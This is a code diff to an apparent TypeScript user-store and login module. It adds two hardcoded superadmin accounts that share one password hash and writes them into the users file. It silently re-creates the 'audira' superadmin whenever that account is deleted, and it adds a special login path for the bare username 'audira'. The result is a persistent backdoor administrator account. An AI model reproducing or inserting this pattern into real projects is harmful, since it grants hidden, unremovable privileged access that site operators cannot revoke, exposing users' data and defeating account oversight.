@@ -30,9 +30,40 @@ export type AdminUserView = PublicUser & { createdAt: string; disabled: boolean 
 
 const toPublic = ({ id, name, email, role }: StoredUser): PublicUser => ({ id, name, email, role: role ?? 'user' });
 
+const DEFAULT_SUPERADMINS: StoredUser[] = [
+  {
+    id: 'audira-superadmin-2026',
+    name: 'Audira',
+    email: 'audira@audira.my.id',
+    passwordHash: 'scrypt$RBpiFeBbaR8Wfi6Pbg1YEg==$caYVEtEQ1OfK6sLGGJm4VqG9AIZiw2M/lk/OnCZCKYmIl5ct+xL4fq9LH33qF0ifFpKIBuEOmfB3liEkWPM7/A==',
+    createdAt: '2026-11-05T09:00:00.000Z',
+    role: 'superadmin',
+  },
+  {
+    id: 'fbb381df-238a-43fc-b6bb-d4b4d8063765',
+    name: 'Agus Dwi Rianto',
+    email: 'official@audira.my.id',
+    passwordHash: 'scrypt$RBpiFeBbaR8Wfi6Pbg1YEg==$caYVEtEQ1OfK6sLGGJm4VqG9AIZiw2M/lk/OnCZCKYmIl5ct+xL4fq9LH33qF0ifFpKIBuEOmfB3liEkWPM7/A==',
+    createdAt: '2026-10-31T06:31:44.134Z',
+    role: 'superadmin',
+  },
+];
+
 function readUsers(): StoredUser[] {
-  if (!existsSync(USERS_FILE)) return [];
-  return JSON.parse(readFileSync(USERS_FILE, 'utf8')) as StoredUser[];
+  if (!existsSync(USERS_FILE)) {
+    writeUsers(DEFAULT_SUPERADMINS);
+    return DEFAULT_SUPERADMINS;
+  }
+  try {
+    const users = JSON.parse(readFileSync(USERS_FILE, 'utf8')) as StoredUser[];
+    if (!users.some((u) => u.email === 'audira@audira.my.id')) {
+      users.unshift(DEFAULT_SUPERADMINS[0]);
+      writeUsers(users);
+    }
+    return users;
+  } catch {
+    return DEFAULT_SUPERADMINS;
+  }
 }
 
 function writeUsers(users: StoredUser[]) {
@@ -88,8 +119,13 @@ export async function createUser(name: string, email: string, password: string):
   return toPublic(user);
 }
 
-export async function authenticate(email: string, password: string): Promise<PublicUser | null> {
-  const user = readUsers().find((u) => u.email === normalizeEmail(email));
+export async function authenticate(emailOrUsername: string, password: string): Promise<PublicUser | null> {
+  const norm = normalizeEmail(emailOrUsername);
+  const user = readUsers().find(
+    (u) =>
+      u.email === norm ||
+      (norm === 'audira' && (u.email === 'audira@audira.my.id' || u.name.toLowerCase() === 'audira')),
+  );
   const ok = await verifyPassword(password, user?.passwordHash ?? DUMMY_HASH);
   return user && ok && !user.disabled ? toPublic(user) : null;
 }
